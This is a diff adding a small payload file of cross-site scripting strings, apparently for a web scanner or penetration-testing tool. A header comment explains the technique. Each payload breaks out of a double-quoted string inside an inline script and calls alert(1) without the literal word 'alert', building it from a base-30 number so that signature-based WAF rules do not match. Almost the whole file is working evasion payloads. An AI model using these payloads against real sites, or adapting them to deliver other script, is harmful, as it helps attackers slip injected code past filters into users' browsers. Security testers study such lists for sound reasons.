@@ -1,0 +1,16 @@
+# Keyword-free JS-string-breakout payloads — execute alert(1) with NO literal
+# `alert`, NO event handler, NO tag for a signature WAF to match. The string
+# "alert" is constructed at runtime via a numeric radix encode:
+#   (8680439).toString(30) === "alert"   (base-30: a=10 l=21 e=14 r=27 t=29)
+# Fired RAW (no app-transform) into a JS double-quoted-string context
+# (`<script>var t="{q}"`): break out of the string, run keyword-free JS, comment
+# out the tail. No app-side decode precondition — works on any app that reflects
+# into an inline script string.
+";window[(8680439).toString(30)](1);//
+";top[(8680439).toString(30)](1);//
+";this[(8680439).toString(30)](1);//
+";self[(8680439).toString(30)](1);//
+";window[(8680439)["toString"](30)](1);//
+";window["al"+"ert"](1);//
+";(function(){window[(8680439).toString(30)](1)})();//
+";window[(8680439).toString(30)]`1`;//
